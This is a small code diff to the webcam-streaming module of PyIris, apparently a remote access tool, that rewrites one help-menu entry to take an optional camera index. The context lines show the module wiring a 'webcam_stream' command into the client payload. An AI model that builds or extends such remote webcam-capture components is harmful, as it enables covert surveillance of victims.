@@ -34,7 +34,7 @@ def webcam_stream(sock, data):
         config.logics.append('''
             elif command == "webcam_stream":
                 webcam_stream(s, data)''')
-        config.help_menu['webcam_stream'] = 'Stream clients webcam to PyIris'
+        config.help_menu['webcam_stream <camera index>'] = 'Stream clients webcam to PyIris. Webcam index is optional, by default it will be zero. In some instances it may need to be provided due to the 0 index being unavailable'
     elif option == 'info':
         print('\nName             : Webcam streaming component' \
               '\nOS               : Linux' \
